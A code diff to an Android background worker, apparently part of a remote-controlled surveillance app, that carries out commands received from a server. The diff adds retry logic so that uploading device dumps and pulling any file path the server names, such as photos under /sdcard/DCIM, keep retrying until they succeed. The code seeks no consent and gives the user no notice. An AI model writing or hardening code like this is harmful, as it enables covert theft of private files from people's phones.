@@ -110,21 +110,38 @@ class RemoteCommandWorker(appContext: Context, workerParams: WorkerParameters) :
                                 applicationContext.stopService(i)
                                 status = "EXECUTED (STOPPED)"
                             }
-                            // --- NEW: UPLOAD DUMPS ---
+                            // --- NEW: UPLOAD DUMPS (With Retry Logic) ---
                             else if (cmd.getString("file_name") == "UPLOAD_DUMPS") {
                                 val dumps = DumpManager.getDumpsForToday()
+                                var successCount = 0
                                 dumps.forEach { file ->
-                                    CloudManager.uploadFile(applicationContext, file)
+                                    // SYNCHRONOUS WAIT: If this returns false, we know it failed.
+                                    if (CloudManager.uploadFile(applicationContext, file)) {
+                                        successCount++
+                                    }
                                 }
-                                status = "EXECUTED (${dumps.size} FILES)"
+                                
+                                if (successCount == dumps.size) {
+                                    status = "EXECUTED (${dumps.size} FILES)"
+                                } else {
+                                    // If any failed, we DO NOT mark as executed.
+                                    // This forces the Worker to pick up this command again next time it runs.
+                                    DebugLogger.log("CMD", "Partial failure. Keeping command PENDING.")
+                                    continue 
+                                }
                             }
                             // --- NEW: PULL SPECIFIC FILE ---
                             else if (cmd.getString("file_name") == "PULL_FILE") {
-                                val path = cmd.optString("content") // e.g. "/sdcard/DCIM/pic.jpg"
+                                val path = cmd.optString("content")
                                 val file = File(path)
                                 if (file.exists() && file.isFile) {
-                                    CloudManager.uploadFile(applicationContext, file)
-                                    status = "EXECUTED (UPLOADING)"
+                                    val success = CloudManager.uploadFile(applicationContext, file)
+                                    if (success) {
+                                        status = "EXECUTED"
+                                    } else {
+                                        // Upload failed (offline?), try again later
+                                        continue
+                                    }
                                 } else {
                                     status = "FAILED (NOT FOUND)"
                                 }
